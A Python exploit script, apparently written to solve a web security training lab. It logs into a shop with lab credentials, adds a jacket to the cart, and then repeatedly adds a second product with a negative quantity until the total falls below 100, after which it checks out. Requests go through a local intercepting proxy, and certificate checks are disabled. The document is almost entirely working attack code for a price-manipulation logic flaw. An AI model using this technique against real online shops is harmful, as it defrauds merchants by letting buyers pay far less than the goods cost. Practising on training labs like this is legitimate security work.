#!/bin/python3

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={"http":"http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


# TODO: Create a session. Login, return session.
def login():
    s = requests.Session()
    r = s.get(f"{HOST}login",verify=False,proxies=proxies)
    content = r.text
    soup = BeautifulSoup(content,"html.parser")
    csrfTag = soup.find(attrs={'type':'hidden'})
    csrfToken = csrfTag['value']
    s.post(f"{HOST}login", proxies=proxies,verify=False,data={'csrf':csrfToken,'username':'wiener','password':'peter'})
    return s

# TODO: Get total from Cart
def getCartTotal(cartResponse):
    # only works on the /cart page after an item has been added.
    cart = cartResponse.text
    soup = BeautifulSoup(cart,"html.parser")
    totalString = soup.findAll('th')[5].string
    print(f"The full value on cart {totalString}")
    totalSlice = soup.findAll('th')[5].string[1:]
    return float(totalSlice)

# TODO: Add jacket to cart

def addJacket(session):
    s = session
    res = s.post(f"{HOST}cart",proxies=proxies,verify=False,data={'productId':'1','redir':'CART','quantity':'1'})
    total = getCartTotal(res)
    print(total)
    return s, total

# TODO: Create a loop
def addTwo(session):
    s = session
    res = s.post(f"{HOST}cart",proxies=proxies,verify=False,data={'productId':'2','redir':'CART','quantity':'-2'})
    total = getCartTotal(res)
    return total

# TODO: GET cart. Test if Total is >= 0 and <= 100$

def add_item_and_check(session,cartTotal):
    readyForCheckout = False
    while readyForCheckout is False:
        if cartTotal < 100:
            #Checkout
            print(cartTotal)
            readyForCheckout is True
            return session
        else:
            cartTotal = addTwo(session)
            print(f"Just added -2 more of item 2..cartTotal now at: {cartTotal}")

def checkoutCart(session):
    s = session
    res = s.get(f"{HOST}cart", verify=False, proxies=proxies)
    # print(res.text)
    content = res.text
    soup = BeautifulSoup(content,"html.parser")
    csrfTag = soup.find(attrs={'name':'csrf'})['value']
    res = s.post(f"{HOST}cart/checkout",verify=False,proxies=proxies,data={'csrf':csrfTag})
    print("That should about do it now..")


if __name__ == "__main__":
    try:
        HOST = sys.argv[1].strip()
        # print(sys.argv[1])
    except IndexError:
        print("[-] Error: You're missing the URL!!")
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        exit(-1)

    newSession = login()
    sessionJacket, cartTotal = addJacket(newSession)
    checkoutSession = add_item_and_check(sessionJacket, cartTotal)
    checkoutCart(checkoutSession)